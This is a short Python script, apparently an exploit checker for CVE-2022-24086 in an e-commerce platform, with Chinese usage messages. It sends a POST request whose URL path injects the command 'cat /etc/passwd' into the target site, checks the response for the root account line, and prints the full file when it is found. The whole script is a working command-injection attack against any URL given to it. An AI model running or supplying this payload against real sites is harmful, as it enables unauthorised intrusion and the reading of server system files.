import requests
import sys
import re

headers = {
    "Cache-Control":"max-age=0",
    "Upgrade-Insecure-Requests":"1"
}

payload = "/checkout/cart/add/product/14/uenc?0=cat+/etc/passwd"

if __name__ == '__main__':
    if len(sys.argv) == 2:
        if re.findall('^http[s]?://.+\.[a-zA-Z]+[/]?$',sys.argv[1]):
            print(sys.argv[1])
        else:
            print('URL参数错误！格式：http(https)://www.baidu.com')
            exit()
    else:
        print('参数错误！使用：python CVE-2022-24086.py 检测的URL')
        exit()
    url = sys.argv[1] + payload
    response = requests.post(url, headers=headers, verify=False)
    str = response.content.decode()
    if str.find("root:x:0:0:root") != -1:
        print("[+] CVE-2022-24086漏洞存在！")
        print(str)